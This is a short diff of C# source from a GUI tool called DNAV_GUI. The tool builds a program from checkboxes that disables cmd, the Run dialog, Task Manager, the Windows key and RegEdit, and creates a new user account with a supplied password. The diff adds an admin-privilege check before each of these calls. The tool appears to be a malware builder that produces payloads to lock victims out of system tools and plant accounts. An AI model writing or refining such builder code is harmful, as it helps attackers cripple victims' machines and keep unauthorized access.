@@ -1324,17 +1324,17 @@ namespace DNAV_GUI
 
             if (cmdCheckbox.IsChecked == true)
             {
-                code += @"Cmd.Disable();";
+                code += @"if(isAdmin)Cmd.Disable();";
             }
 
             if (runCheckbox.IsChecked == true)
             {
-                code += @"Run.Disable();";
+                code += @"if(isAdmin)Run.Disable();";
             }
 
             if (taskmanagerCheckbox.IsChecked == true)
             {
-                code += @"Taskmanager.Disable();";
+                code += @"if(isAdmin)Taskmanager.Disable();";
             }
 
             if (taskbarCheckbox.IsChecked == true)
@@ -1344,7 +1344,7 @@ namespace DNAV_GUI
 
             if (windowskeyCheckbox.IsChecked == true)
             {
-                code += @"WindowsKey.Disable();";
+                code += @"if(isAdmin)WindowsKey.Disable();";
             }
 
             if (powershellCheckbox.IsChecked == true)
@@ -1354,12 +1354,12 @@ namespace DNAV_GUI
 
             if (regeditCheckbox.IsChecked == true)
             {
-                code += @"RegEdit.Disable();";
+                code += @"if(isAdmin)RegEdit.Disable();";
             }
 
             if (createUserCheckbox.IsChecked == true)
             {
-                code += @"User.Create(""" + createUserUsernameTextbox.Text + @""", """ + createUserPasswortTextbox.Password + @""");";
+                code += @"if(isAdmin)User.Create(""" + createUserUsernameTextbox.Text + @""", """ + createUserPasswortTextbox.Password + @""");";
             }
 
             code += "}"; // Close void Main
